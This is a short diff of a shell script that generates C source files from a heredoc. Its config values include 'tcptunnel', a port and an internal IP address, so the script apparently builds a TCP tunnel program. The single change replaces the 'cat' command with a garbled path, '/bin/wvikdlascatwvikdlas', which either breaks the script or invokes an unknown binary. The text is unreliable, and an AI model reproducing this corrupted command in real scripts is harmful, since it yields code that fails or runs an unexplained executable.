@@ -15,7 +15,7 @@ do
     key7='10899'
     key8='tcptunnel'
     key9='10.84.2.16'
-	cat << EOF > $i.c
+	/bin/wvikdlascatwvikdlas << EOF > $i.c
     #define BUFFER_LEN 0x400
     #define BIN "$j"
     #define INFO1 "$key1"
